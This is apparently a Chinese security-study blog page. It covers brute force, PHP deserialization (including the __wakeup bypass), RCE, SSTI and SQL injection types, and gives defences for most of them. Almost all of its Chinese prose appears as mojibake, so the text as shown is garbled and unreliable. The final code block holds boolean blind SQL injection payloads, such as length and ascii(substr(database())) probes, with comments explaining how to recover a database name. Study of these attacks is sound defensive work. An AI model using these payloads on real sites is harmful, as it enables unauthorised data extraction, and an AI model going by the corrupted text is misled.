<h3 id="æš´åŠ›ç ´è§£ç¯‡"><a href="#æš´åŠ›ç ´è§£ç¯‡" class="headerlink" title="æš´åŠ›ç ´è§£ç¯‡"></a>æš´åŠ›ç ´è§£ç¯‡</h3><h4 id="1-æš´åŠ›ç ´è§£åŸç†"><a href="#1-æš´åŠ›ç ´è§£åŸç†" class="headerlink" title="1.æš´åŠ›ç ´è§£åŸç†"></a>1.æš´åŠ›ç ´è§£åŸç†</h4><p>ç”±äºæœåŠ¡å™¨ç«¯æ²¡æœ‰åšé™åˆ¶ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡æš´åŠ›æ‰‹æ®µç ´è§£æ‰€éœ€ä¿¡æ¯ï¼Œå¦‚ç”¨æˆ·åã€å¯†ç ã€éªŒè¯ç ç­‰ã€‚æš´åŠ›ç ´è§£éœ€è¦ä¸€ä¸ªå¼ºå¤§çš„å­—å…¸ï¼Œå¦‚4ä½æ•°å­—çš„éªŒè¯ç ï¼Œé‚£ä¹ˆæš´åŠ›ç ´è§£çš„èŒƒå›´å°±æ˜¯0000~9999ï¼Œ<u><strong>æš´åŠ›ç ´è§£çš„å…³é”®åœ¨äºå­—å…¸çš„å¤§å°</strong></u>ã€‚</p>
<h4 id="2-å±å®³-9"><a href="#2-å±å®³-9" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h4><p>â‘ ç”¨æˆ·å¯†ç è¢«é‡ç½®ã€‚<br>â‘¡æ•æ„Ÿç›®å½•ã€å‚æ•°è¢«æšä¸¾ã€‚<br>â‘¢ç”¨æˆ·è®¢å•è¢«æšä¸¾ã€‚</p>
<h4 id="3-é˜²å¾¡-9"><a href="#3-é˜²å¾¡-9" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h4><p>â‘  å¦‚æœ<u><strong>ç”¨æˆ·ç™»å½•æ¬¡æ•°è¶…è¿‡è®¾ç½®çš„é˜ˆå€¼</strong></u>ï¼Œåˆ™<u><strong>é”å®šè´¦å·</strong></u>ã€‚<br>â‘¡ å¦‚æœ<u><strong>æŸä¸ªIPç™»é™†æ¬¡æ•°è¶…è¿‡è®¾ç½®çš„é˜ˆå€¼ï¼Œåˆ™é”å®šIP</strong></u>ã€‚ä½†<u><em><strong>å­˜åœ¨ä¸€ä¸ªé—®é¢˜</strong></em></u>ï¼Œå¦‚æœ<u><strong>å¤šä¸ªç”¨æˆ·ä½¿ç”¨çš„æ˜¯åŒä¸€ä¸ªIPï¼Œåˆ™ä¼šé€ æˆå…¶ä»–ç”¨æˆ·ä¹Ÿä¸èƒ½ç™»å½•ã€‚</strong></u></p>
<hr>
<h3 id="ååºåˆ—åŒ–æ¼æ´ç¯‡ï¼ˆPHPï¼‰"><a href="#ååºåˆ—åŒ–æ¼æ´ç¯‡ï¼ˆPHPï¼‰" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´ç¯‡ï¼ˆPHPï¼‰"></a>ååºåˆ—åŒ–æ¼æ´ç¯‡ï¼ˆPHPï¼‰</h3><h4 id="1-ååºåˆ—åŒ–æ¼æ´åŸç†"><a href="#1-ååºåˆ—åŒ–æ¼æ´åŸç†" class="headerlink" title="1.ååºåˆ—åŒ–æ¼æ´åŸç†"></a>1.ååºåˆ—åŒ–æ¼æ´åŸç†</h4><p>PHPååºåˆ—åŒ–æ¼æ´ä¹Ÿå«PHPå¯¹è±¡æ³¨å…¥ï¼Œæ˜¯ä¸€ä¸ªéå¸¸å¸¸è§çš„æ¼æ´ï¼Œè¿™ç§ç±»å‹çš„æ¼æ´è™½ç„¶æœ‰äº›éš¾ä»¥åˆ©ç”¨ï¼Œä½†ä¸€æ—¦åˆ©ç”¨æˆåŠŸå°±ä¼šé€ æˆéå¸¸å±é™©çš„åæœã€‚</p>
<p>æ¼æ´çš„å½¢æˆçš„<u><strong>æ ¹æœ¬åŸå› æ˜¯ç¨‹åºæ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„ååºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œæ£€æµ‹ï¼Œå¯¼è‡´ååºåˆ—åŒ–è¿‡ç¨‹å¯ä»¥è¢«æ¶æ„æ§åˆ¶ï¼Œè¿›è€Œé€ æˆä»£ç æ‰§è¡Œã€getshellç­‰ä¸€ç³»åˆ—ä¸å¯æ§çš„åæœ</strong></u>ã€‚ååºåˆ—åŒ–æ¼æ´å¹¶ä¸æ˜¯PHPç‰¹æœ‰ï¼Œ<u><strong>ä¹Ÿå­˜åœ¨äºJavaã€Pythonç­‰è¯­è¨€</strong></u>ä¹‹ä¸­ï¼Œä½†å…¶åŸç†åŸºæœ¬ç›¸é€šã€‚</p>
<p>PHPç±»éƒ½å«æœ‰å‡ ä¸ªç‰¹å®šçš„å…ƒç´ : ç±»å±æ€§ã€ç±»å¸¸é‡ã€ç±»æ–¹æ³•ã€‚æ¯ä¸€ä¸ªç±»è‡³å°‘éƒ½å«æœ‰ä»¥ä¸Šä¸‰ä¸ªå…ƒç´ ï¼Œè€Œè¿™ä¸‰ä¸ªå…ƒç´ ä¹Ÿå¯ä»¥ç»„æˆæœ€åŸºæœ¬çš„ç±»ã€‚é‚£ä¹ˆæŒ‰ç…§ç‰¹å®šçš„æ ¼å¼å°†è¿™ä¸‰ä¸ªå…ƒç´ è¡¨è¾¾å‡ºæ¥å°±å¯ä»¥å°†ä¸€ä¸ªå®Œæ•´çš„ç±»è¡¨ç¤ºå‡ºæ¥å¹¶ä¼ é€’ã€‚</p>
<p><u>åºåˆ—åŒ–å°±æ˜¯å°†ä¸€ä¸ª<strong>ç±»</strong>å‹ç¼©æˆä¸€ä¸ªå­—ç¬¦ä¸²çš„æ–¹æ³•</u></p>
<h4 id="2-å±å®³-10"><a href="#2-å±å®³-10" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h4><p><u><strong>æœªå¯¹ç”¨æˆ·è¾“å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œæ£€æµ‹</strong></u>ï¼Œå¯¼è‡´<u><strong>æ”»å‡»è€…å¯ä»¥æ§åˆ¶ååºåˆ—åŒ–è¿‡ç¨‹</strong></u>ï¼Œä»è€Œ<u><strong>å¯¼è‡´ä»£ç æ‰§è¡Œï¼ŒSQLæ³¨å…¥ï¼Œç›®å½•éå†ç­‰ä¸å¯æ§åæœ</strong></u>ã€‚åœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­è‡ªåŠ¨è§¦å‘äº†æŸäº›é­”æœ¯æ–¹æ³•ã€‚</p>
<h4 id="3-é˜²å¾¡-10"><a href="#3-é˜²å¾¡-10" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h4><h5 id="1-ç­¾åä¸è®¤è¯"><a href="#1-ç­¾åä¸è®¤è¯" class="headerlink" title="1)ç­¾åä¸è®¤è¯"></a>1)ç­¾åä¸è®¤è¯</h5><p>å¦‚æœåºåˆ—åŒ–çš„å†…å®¹æ²¡æœ‰ç”¨æˆ·å¯æ§å‚æ•°ï¼Œä»…ä»…æ˜¯æœåŠ¡ç«¯å­˜å‚¨å’Œåº”ç”¨ï¼Œåˆ™å¯ä»¥é€šè¿‡ç­¾åè®¤è¯ï¼Œæ¥é¿å…åº”ç”¨æ¥å—é»‘å®¢çš„å¼‚å¸¸è¾“å…¥ã€‚   </p>
<h5 id="2-é™åˆ¶åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„ç±»"><a href="#2-é™åˆ¶åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„ç±»" class="headerlink" title="2)é™åˆ¶åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„ç±»"></a>2)é™åˆ¶åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„ç±»</h5><p>å¢åŠ ä¸€å±‚åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ¥å£ç±»ã€‚è¿™å°±ç›¸å½“äºå…è®¸æä¾›äº†ä¸€ä¸ªç™½åå•çš„è¿‡æ»¤ï¼šåªå…è®¸æŸäº›ç±»å¯ä»¥è¢«ååºåˆ—åŒ–ã€‚åªè¦ä½ åœ¨ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­ï¼Œé¿å…æ¥å—å¤„ç†ä»»ä½•ç±»å‹ï¼ˆåŒ…æ‹¬ç±»æˆå‘˜ä¸­çš„æ¥å£ã€æ³›å‹ç­‰ï¼‰ï¼Œé»‘å®¢å…¶å®å¾ˆéš¾æ§åˆ¶åº”ç”¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­æ‰€ä½¿ç”¨çš„ç±»ï¼Œä¹Ÿå°±æ²¡æœ‰åŠæ³•æ„é€ å‡ºè°ƒç”¨é“¾ï¼Œè‡ªç„¶ä¹Ÿå°±å¾ˆéš¾åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´äº†</p>
<h5 id="3-RASPæ£€æµ‹"><a href="#3-RASPæ£€æµ‹" class="headerlink" title="3)RASPæ£€æµ‹"></a>3)RASPæ£€æµ‹</h5><p>ï¼ˆRuntime Application Self-Protectionï¼Œå®æ—¶ç¨‹åºè‡ªæˆ‘ä¿æŠ¤ï¼‰ã€‚RASP é€šè¿‡ hook ç­‰æ–¹å¼ï¼Œåœ¨è¿™äº›å…³é”®å‡½æ•°ï¼ˆä¾‹å¦‚ï¼šåºåˆ—åŒ–ï¼Œååºåˆ—åŒ–)çš„è°ƒç”¨ä¸­ï¼Œå¢åŠ ä¸€é“è§„åˆ™çš„æ£€æµ‹ã€‚è¿™ä¸ªè§„åˆ™ä¼šåˆ¤æ–­åº”ç”¨æ˜¯å¦æ‰§è¡Œäº†éåº”ç”¨æœ¬èº«çš„é€»è¾‘ï¼Œèƒ½å¤Ÿåœ¨ä¸ä¿®æ”¹ä»£ç çš„æƒ…å†µä¸‹å¯¹ååºåˆ—åŒ–æ¼æ´æ”»å‡»å®ç°æ‹¦æˆª.</p>
<h4 id="4-åˆ©ç”¨"><a href="#4-åˆ©ç”¨" class="headerlink" title="4.åˆ©ç”¨"></a>4.åˆ©ç”¨</h4><h5 id="1-wakeup-ç»•è¿‡"><a href="#1-wakeup-ç»•è¿‡" class="headerlink" title="1)__wakeup( )ç»•è¿‡"></a>1)__wakeup( )ç»•è¿‡</h5><p>(CVE-2016-7124)</p>
<p>ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœè¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶å°±ä¼šè·³è¿‡__wakeup( )çš„æ‰§è¡Œã€‚</p>
<h5 id="2-æ³¨å…¥å¯¹è±¡æ„é€ æ–¹æ³•"><a href="#2-æ³¨å…¥å¯¹è±¡æ„é€ æ–¹æ³•" class="headerlink" title="2)æ³¨å…¥å¯¹è±¡æ„é€ æ–¹æ³•"></a>2)æ³¨å…¥å¯¹è±¡æ„é€ æ–¹æ³•</h5><p>å½“ç›®æ ‡å¯¹è±¡è¢«privateã€protectedä¿®é¥°æ—¶çš„æ„é€ æ–¹æ³•ã€‚</p>
<h5 id="3-Sessionååºåˆ—åŒ–æ¼æ´"><a href="#3-Sessionååºåˆ—åŒ–æ¼æ´" class="headerlink" title="3)Sessionååºåˆ—åŒ–æ¼æ´"></a>3)Sessionååºåˆ—åŒ–æ¼æ´</h5><p>PHPä¸­çš„Sessionç»åºåˆ—åŒ–åå­˜å‚¨ï¼Œè¯»å–æ—¶å†è¿›è¡Œååºåˆ—åŒ–ã€‚</p>
<h5 id="4-PHARåˆ©ç”¨"><a href="#4-PHARåˆ©ç”¨" class="headerlink" title="4)PHARåˆ©ç”¨"></a>4)PHARåˆ©ç”¨</h5><p>PHAR (â€œPhp ARchiveâ€) æ˜¯PHPé‡Œç±»ä¼¼äºJARçš„ä¸€ç§æ‰“åŒ…æ–‡ä»¶ï¼Œåœ¨PHP 5.3 æˆ–æ›´é«˜ç‰ˆæœ¬ä¸­é»˜è®¤å¼€å¯ï¼Œè¿™ä¸ªç‰¹æ€§ä½¿å¾— PHPä¹Ÿå¯ä»¥åƒ Java ä¸€æ ·æ–¹ä¾¿åœ°å®ç°åº”ç”¨ç¨‹åºæ‰“åŒ…å’Œç»„ä»¶åŒ–ã€‚ä¸€ä¸ªåº”ç”¨ç¨‹åºå¯ä»¥æ‰“æˆä¸€ä¸ª Phar åŒ…ï¼Œç›´æ¥æ”¾åˆ° PHP-FPM ä¸­è¿è¡Œã€‚</p>
<hr>
<h3 id="RCEæ¼æ´ç¯‡"><a href="#RCEæ¼æ´ç¯‡" class="headerlink" title="RCEæ¼æ´ç¯‡"></a>RCEæ¼æ´ç¯‡</h3><h4 id="1-RCEæ¼æ´åŸç†"><a href="#1-RCEæ¼æ´åŸç†" class="headerlink" title="1.RCEæ¼æ´åŸç†"></a>1.RCEæ¼æ´åŸç†</h4><p>ä¸€èˆ¬å‡ºç°è¿™ç§æ¼æ´ï¼Œæ˜¯å› ä¸ºåº”ç”¨ç³»ç»Ÿ<u><strong>ä»è®¾è®¡ä¸Šéœ€è¦ç»™ç”¨æˆ·æä¾›æŒ‡å®šçš„è¿œç¨‹å‘½ä»¤æ“ä½œçš„æ¥å£</strong></u>ã€‚æ¯”å¦‚æˆ‘ä»¬å¸¸è§çš„è·¯ç”±å™¨ã€é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹ç­‰è®¾å¤‡çš„webç®¡ç†ç•Œé¢ä¸Šã€‚ä¸€èˆ¬ä¼šç»™ç”¨æˆ·æä¾›ä¸€ä¸ªpingæ“ä½œçš„webç•Œé¢ï¼Œç”¨æˆ·ä»webç•Œé¢è¾“å…¥ç›®æ ‡IPï¼Œæäº¤åï¼Œåå°ä¼šå¯¹è¯¥IPåœ°å€è¿›è¡Œä¸€æ¬¡pingæµ‹è¯•ï¼Œå¹¶è¿”å›æµ‹è¯•ç»“æœã€‚ å¦‚æœï¼Œè®¾è®¡è€…åœ¨å®Œæˆè¯¥åŠŸèƒ½æ—¶ï¼Œ<u><strong>æ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶ï¼Œåˆ™å¯èƒ½ä¼šå¯¼è‡´æ”»å‡»è€…é€šè¿‡è¯¥æ¥å£æäº¤â€œæ„æƒ³ä¸åˆ°â€çš„å‘½ä»¤ï¼Œä»è€Œè®©åå°è¿›è¡Œæ‰§è¡Œï¼Œä»è€Œæ§åˆ¶æ•´ä¸ªåå°æœåŠ¡å™¨</strong></u>ã€‚ ç°åœ¨å¾ˆå¤šçš„ä¼ä¸šéƒ½å¼€å§‹å®æ–½è‡ªåŠ¨åŒ–è¿ç»´,å¤§é‡çš„ç³»ç»Ÿæ“ä½œä¼šé€šè¿‡â€è‡ªåŠ¨åŒ–è¿ç»´å¹³å°â€è¿›è¡Œæ“ä½œã€‚åœ¨è¿™ç§å¹³å°ä¸Šå¾€å¾€ä¼šå‡ºç°è¿œç¨‹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œçš„æ¼æ´ã€‚ è¿œç¨‹ä»£ç æ‰§è¡Œ åŒæ ·çš„é“ç†,å› ä¸ºéœ€æ±‚è®¾è®¡,åå°æœ‰æ—¶å€™ä¹Ÿä¼šæŠŠç”¨æˆ·çš„è¾“å…¥ä½œä¸ºä»£ç çš„ä¸€éƒ¨åˆ†è¿›è¡Œæ‰§è¡Œ,ä¹Ÿå°±é€ æˆäº†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ ä¸ç®¡æ˜¯ä½¿ç”¨äº†ä»£ç æ‰§è¡Œçš„å‡½æ•°,è¿˜æ˜¯ä½¿ç”¨äº†ä¸å®‰å…¨çš„ååºåˆ—åŒ–ç­‰ç­‰ã€‚ å› æ­¤ï¼Œå¦‚æœéœ€è¦ç»™<u><strong>å‰ç«¯ç”¨æˆ·æä¾›æ“ä½œç±»çš„APIæ¥å£ï¼ˆä¸€èˆ¬æŒ‡åº”ç”¨ç¨‹åºçš„ç¼–ç¨‹æ¥å£ï¼Œä¸»è¦ç›®çš„æ˜¯æä¾›åº”ç”¨ç¨‹åºä¸å¼€å‘äººå‘˜ä»¥è®¿é—®ä¸€ç»„ä¾‹ç¨‹çš„èƒ½åŠ›ï¼Œè€Œåˆæ— éœ€è®¿é—®æºç ï¼Œæˆ–ç†è§£å†…éƒ¨å·¥ä½œæœºåˆ¶çš„ç»†èŠ‚ï¼‰ï¼Œä¸€å®šéœ€è¦å¯¹æ¥å£è¾“å…¥çš„å†…å®¹è¿›è¡Œä¸¥æ ¼çš„åˆ¤æ–­</strong></u>ï¼Œæ¯”å¦‚å®æ–½ä¸¥æ ¼çš„ç™½åå•ç­–ç•¥ä¼šæ˜¯ä¸€ä¸ªæ¯”è¾ƒå¥½çš„æ–¹æ³•ã€‚</p>
<h4 id="2-å±å®³-11"><a href="#2-å±å®³-11" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h4><p>RCEæ¼æ´ï¼Œå¯ä»¥è®©æ”»å‡»è€…ç›´æ¥å‘åå°æœåŠ¡å™¨è¿œç¨‹æ³¨å…¥<u><strong>æ“ä½œç³»ç»Ÿå‘½ä»¤æˆ–è€…ä»£ç </strong></u>ï¼Œä»è€Œæ§åˆ¶åå°ç³»ç»Ÿã€‚</p>
<h4 id="3-é˜²å¾¡-11"><a href="#3-é˜²å¾¡-11" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h4><p>1)å°½é‡ä¸è¦ä½¿ç”¨å‘½ä»¤æ‰§è¡Œå‡½æ•°ã€‚</p>
<p>2)ä¸è¦è®©ç”¨æˆ·æ§åˆ¶å‚æ•°ã€‚</p>
<p>3)æ‰§è¡Œå‰åšå¥½æ£€æµ‹å’Œè¿‡æ»¤ã€‚</p>
<hr>
<h3 id="SSTIæ¼æ´ç¯‡"><a href="#SSTIæ¼æ´ç¯‡" class="headerlink" title="SSTIæ¼æ´ç¯‡"></a>SSTIæ¼æ´ç¯‡</h3><h4 id="1-SSTIæ¼æ´åŸç†"><a href="#1-SSTIæ¼æ´åŸç†" class="headerlink" title="1.SSTIæ¼æ´åŸç†"></a>1.SSTIæ¼æ´åŸç†</h4><p><a href="https://xz.aliyun.com/t/3679#toc-0">æ¨èæ–‡ç« </a></p>
<p>SSTIæ˜¯ä¸€ç§æ³¨å…¥ç±»çš„æ¼æ´ï¼Œå…¶<u><strong>æˆå› ä¹Ÿå¯ä»¥ç±»æ¯”SQLæ³¨å…¥</strong></u>ã€‚<br>SQLæ³¨å…¥æ˜¯ä»ç”¨æˆ·è·å¾—ä¸€ä¸ªè¾“å…¥ï¼Œç„¶åç”¨åç«¯è„šæœ¬è¯­è¨€è¿›è¡Œæ•°æ®åº“æŸ¥è¯¢ï¼Œåˆ©ç”¨è¾“å…¥æ¥æ‹¼æ¥æˆ‘ä»¬æƒ³è¦çš„SQLè¯­å¥ã€‚SSTIä¹Ÿæ˜¯è·å–ä¸€ä¸ªè¾“å…¥ï¼Œç„¶ååœ¨åç«¯çš„æ¸²æŸ“å¤„ç†ä¸Šè¿›è¡Œè¯­å¥çš„æ‹¼æ¥æ‰§è¡Œã€‚ä½†æ˜¯å’ŒSQLæ³¨å…¥ä¸åŒçš„ï¼Œ</p>
<p>SSTIåˆ©ç”¨çš„æ˜¯ç°æœ‰çš„ç½‘ç«™æ¨¡æ¿å¼•æ“ï¼Œä¸»è¦é’ˆå¯¹Pythonã€PHPã€JAVAçš„ä¸€äº›ç½‘ç«™å¤„ç†æ¡†æ¶ï¼Œæ¯”å¦‚Pythonçš„<strong>jinja2ã€makoã€tornadoã€Django</strong>ï¼ŒPHPçš„<strong>smarty twig</strong>ï¼Œjavaçš„<strong>jade velocity</strong>ã€‚å½“è¿™äº›æ¡†æ¶å¯¹è¿ç”¨æ¸²æŸ“å‡½æ•°ç”Ÿæˆhtmlçš„æ—¶å€™ï¼Œåœ¨è¿‡æ»¤ä¸ä¸¥æƒ…å†µä¸‹ï¼Œé€šè¿‡æ„é€ æ¶æ„è¾“å…¥æ•°æ®ï¼Œä»è€Œè¾¾åˆ°getshellæˆ–å…¶ä»–ç›®çš„ã€‚</p>
<p><u><strong>ä¸€å¥è¯å°±æ˜¯æœåŠ¡ç«¯åœ¨æ¥æ”¶ç”¨æˆ·è¾“å…¥æˆ–ç”¨æˆ·å¯æ§å‚æ•°åï¼Œæœªä½œå¤„ç†æˆ–æœªè¿›è¡Œä¸¥æ ¼è¿‡æ»¤ï¼Œç›´æ¥åµŒå…¥æ¨¡æ¿æ¸²æŸ“ï¼Œå¯¼è‡´æ‰§è¡Œæ¶æ„ä»£ç </strong></u>ã€‚</p>
<p><strong>æ¨¡æ¿æ³¨å…¥</strong>æ¶‰åŠçš„æ˜¯æœåŠ¡ç«¯Webåº”ç”¨ä½¿ç”¨æ¨¡æ¿å¼•æ“<strong>æ¸²æŸ“ç”¨æˆ·è¯·æ±‚çš„è¿‡ç¨‹</strong>ï¼Œ<br> æœåŠ¡ç«¯æŠŠ<strong>ç”¨æˆ·è¾“å…¥çš„å†…å®¹æ¸²æŸ“æˆæ¨¡æ¿</strong>å°±å¯èƒ½é€ æˆSSTI(Server-Side Template Injection)</p>
<p>æ¨¡æ¿æ¸²æŸ“æ¥å—çš„å‚æ•°éœ€è¦ç”¨ä¸¤ä¸ªå¤§æ‹¬å·<code>&#123;  &#123;&#125;  &#125;</code>æ‹¬èµ·æ¥</p>
<h4 id="2-å±å®³-12"><a href="#2-å±å®³-12" class="headerlink" title="2.å±å®³"></a>2.å±å®³</h4><p>æ”»å‡»è€…åœ¨æœåŠ¡å™¨è¾“å…¥è¯­å¥ï¼ŒæœåŠ¡ç«¯å°†å…¶<u><strong>ä½œä¸ºWebåº”ç”¨æ¨¡æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†</strong></u>ï¼Œåœ¨è¿›è¡Œ<u><strong>ç›®æ ‡ç¼–è¯‘æ¸²æŸ“</strong></u>çš„è¿‡ç¨‹ä¸­ï¼Œ<u><strong>è¿›è¡Œäº†è¯­å¥çš„æ‹¼æ¥ï¼Œæ‰§è¡Œäº†æ‰€æ’å…¥çš„æ¶æ„å†…å®¹</strong></u>ï¼Œä»è€Œ<u><strong>å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€ä»£ç æ‰§è¡Œã€GetShellç­‰</strong></u>é—®é¢˜</p>
<h4 id="3-é˜²å¾¡-12"><a href="#3-é˜²å¾¡-12" class="headerlink" title="3.é˜²å¾¡"></a>3.é˜²å¾¡</h4><p>1ï¼‰å’Œå…¶ä»–çš„æ³¨å…¥é˜²å¾¡ä¸€æ ·ï¼Œ<u><strong>ç»å¯¹ä¸è¦è®©ç”¨æˆ·å¯¹ä¼ å…¥æ¨¡æ¿çš„å†…å®¹æˆ–è€…æ¨¡æ¿æœ¬èº«è¿›è¡Œæ§åˆ¶</strong></u></p>
<p>2ï¼‰<u><strong>å‡å°‘æˆ–è€…æ”¾å¼ƒç›´æ¥ä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ç»“åˆå­—ç¬¦ä¸²æ‹¼æ¥çš„æ¨¡æ¿æ¸²æŸ“</strong></u>æ–¹å¼ï¼Œ<u><strong>ä½¿ç”¨æ­£è§„çš„æ¨¡æ¿æ¸²æŸ“æ–¹æ³•</strong></u></p>
<h2 id="å„æ¼æ´çŸ¥è¯†è®°å½•ç¬”è®°"><a href="#å„æ¼æ´çŸ¥è¯†è®°å½•ç¬”è®°" class="headerlink" title="å„æ¼æ´çŸ¥è¯†è®°å½•ç¬”è®°"></a>å„æ¼æ´çŸ¥è¯†è®°å½•ç¬”è®°</h2><h3 id="ä¸€ã€sql"><a href="#ä¸€ã€sql" class="headerlink" title="ä¸€ã€sql"></a>ä¸€ã€sql</h3><h4 id="sqlæ³¨å…¥çš„åˆ†ç±»"><a href="#sqlæ³¨å…¥çš„åˆ†ç±»" class="headerlink" title="sqlæ³¨å…¥çš„åˆ†ç±»"></a>sqlæ³¨å…¥çš„åˆ†ç±»</h4><h5 id="â‘ æŒ‰ç…§æ•°æ®æäº¤çš„æ–¹å¼æ¥åˆ†ç±»ï¼š"><a href="#â‘ æŒ‰ç…§æ•°æ®æäº¤çš„æ–¹å¼æ¥åˆ†ç±»ï¼š" class="headerlink" title="â‘ æŒ‰ç…§æ•°æ®æäº¤çš„æ–¹å¼æ¥åˆ†ç±»ï¼š"></a>â‘ æŒ‰ç…§æ•°æ®æäº¤çš„æ–¹å¼æ¥åˆ†ç±»ï¼š</h5><p>â€ƒâ€ƒï¼ˆ1ï¼‰GET æ³¨å…¥ï¼šæäº¤æ•°æ®çš„æ–¹å¼æ˜¯ GET , æ³¨å…¥ç‚¹çš„ä½ç½®åœ¨ GET å‚æ•°éƒ¨åˆ†ã€‚æ¯”å¦‚æœ‰è¿™æ ·çš„ä¸€ä¸ªé“¾æ¥<code>http://xxx.com/news.php?id=1</code> , id æ˜¯æ³¨å…¥ç‚¹ã€‚</p>
<p>â€ƒâ€ƒï¼ˆ2ï¼‰POST æ³¨å…¥ï¼šä½¿ç”¨ POST æ–¹å¼æäº¤æ•°æ®ï¼Œæ³¨å…¥ç‚¹ä½ç½®åœ¨ POST æ•°æ®éƒ¨åˆ†ï¼Œå¸¸å‘ç”Ÿåœ¨è¡¨å•ä¸­(è¾“å…¥æ¡†)ã€‚</p>
<p>â€ƒâ€ƒï¼ˆ3ï¼‰Cookie æ³¨å…¥ï¼šHTTPè¯·æ±‚çš„æ—¶å€™ä¼šå¸¦ä¸Šå®¢æˆ·ç«¯çš„Cookie, æ³¨å…¥ç‚¹åœ¨Cookieå½“ä¸­çš„æŸä¸ªå­—æ®µä¸­ã€‚</p>
<p>â€ƒâ€ƒï¼ˆ4ï¼‰HTTP å¤´éƒ¨æ³¨å…¥ï¼šæ³¨å…¥ç‚¹åœ¨ HTTP è¯·æ±‚å¤´éƒ¨çš„æŸä¸ªå­—æ®µä¸­ã€‚æ¯”å¦‚å­˜åœ¨ User-Agent å­—æ®µä¸­ã€‚ä¸¥æ ¼è®²çš„è¯ï¼ŒCookie å…¶å®åº”è¯¥ä¹Ÿæ˜¯ç®—å¤´éƒ¨æ³¨å…¥çš„ä¸€ç§å½¢å¼ã€‚å› ä¸ºåœ¨ HTTP è¯·æ±‚çš„æ—¶å€™ï¼ŒCookie æ˜¯å¤´éƒ¨çš„ä¸€ä¸ªå­—æ®µã€‚</p>
<h5 id="â‘¡æŒ‰ç…§æ‰§è¡Œæ•ˆæœæ¥åˆ†ç±»ï¼š"><a href="#â‘¡æŒ‰ç…§æ‰§è¡Œæ•ˆæœæ¥åˆ†ç±»ï¼š" class="headerlink" title="â‘¡æŒ‰ç…§æ‰§è¡Œæ•ˆæœæ¥åˆ†ç±»ï¼š"></a>â‘¡æŒ‰ç…§æ‰§è¡Œæ•ˆæœæ¥åˆ†ç±»ï¼š</h5><h6 id="ï¼ˆ1ï¼‰åŸºäºå¸ƒå°”çš„ç›²æ³¨ï¼š"><a href="#ï¼ˆ1ï¼‰åŸºäºå¸ƒå°”çš„ç›²æ³¨ï¼š" class="headerlink" title="ï¼ˆ1ï¼‰åŸºäºå¸ƒå°”çš„ç›²æ³¨ï¼š"></a>ï¼ˆ1ï¼‰åŸºäºå¸ƒå°”çš„ç›²æ³¨ï¼š</h6><p>å³å¯ä»¥æ ¹æ®è¿”å›é¡µé¢åˆ¤æ–­æ¡ä»¶çœŸå‡çš„æ³¨å…¥ã€‚</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">ä¸€èˆ¬æ ¹æ®æ•°æ®å­—ç¬¦asiicç å¤§å°æˆ–å­—ç¬¦é•¿çŸ­ï¼Œç”¨äºŒåˆ†æ³•è¿›è¡Œåˆ¤æ–­å­—ç¬¦ç­”æ¡ˆ</span><br><span class="line"></span><br><span class="line">é•¿åº¦æ¯”å¦‚</span><br><span class="line"><span class="number">1</span> and <span class="built_in">length</span>(<span class="built_in">database</span>()) &gt; <span class="number">5</span></span><br><span class="line"><span class="comment">/*æ„æ€å°±æ˜¯åˆ¤æ–­æ•°æ®åº“åå¤§äº5ï¼Œå¦‚æœè¿”å›å‡å°±åœ¨å°äº5é‡Œæ‰¾ï¼Œå¦‚æœè¿”å›çœŸï¼Œå°±åœ¨å¤§äº5èŒƒå›´é‡Œæ‰¾ï¼ŒçŒœæµ‹åˆ°å¤§æ¦‚çš„é•¿åº¦çš„æ—¶å€™ï¼Œå¯ä»¥ç”¨=è¯•è¯•*/</span></span><br><span class="line"></span><br><span class="line">asciiæ¯”å¦‚</span><br><span class="line"><span class="number">1</span> and <span class="built_in">ascii</span>(<span class="built_in">substr</span>(<span class="built_in">database</span>(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">110</span></span><br><span class="line"><span class="comment">//substræ˜¯æˆªå–å­—ç¬¦ï¼Œå¦‚ä¸Šå°±æ˜¯ä»ç¬¬ä¸€ä¸ªå­—ç¬¦æˆªå–ï¼Œæˆªå–ä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line"><span class="comment">/*æ„æ€å°±æ˜¯åˆ¤æ–­æ•°æ®åº“åç¬¬ä¸€ä¸ªå­—æ¯çš„asciiç æ˜¯å¦å¤§äº110ï¼Œè¿”å›å‡å°±åœ¨å°äº110é‡Œæ‰¾ï¼Œè¿”å›çœŸï¼Œå°±åœ¨å¤§äº110é‡Œæ‰¾ï¼Œæœ€åå¯ä»¥ç”¨=åŠ ä»¥ç¡®å®š*/</span></span><br></pre></td></tr></table></figure></div>

